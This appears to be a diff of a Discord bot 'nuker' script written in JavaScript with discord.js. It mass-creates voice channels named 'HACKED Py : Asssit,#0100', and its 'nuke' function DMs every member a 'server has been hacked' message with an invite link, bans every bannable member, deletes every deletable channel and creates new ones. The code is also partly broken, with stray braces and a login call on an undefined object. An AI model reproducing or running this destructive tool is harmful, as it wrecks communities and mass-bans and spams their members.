+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+ 
+ 
+})
+}
+ 
+});
+ 
+ 
+const { Client } = require('discord.js');
+const client = new Client();
+ 
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+ 
+  await guild.fetchMembers();
+ 
+  await guild.owner.send(' By HACKED Py : Asssit,#0100.').catch(e => { return void e; });
+ 
+ 
+ 
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('The server has been hacked. Welcome to https://discord.gg/D5YWPd').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+ 
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+ 
+    await guild.createChannel('@Hac ', 'voice');
+ 
+      await guild.createChannel('@Hac', 'text');
+ 
+ 
+ 
+}
+ 
+
+ 
+   
+ 
+ 
+ 
+ 
+LOka.login(process.env.B)
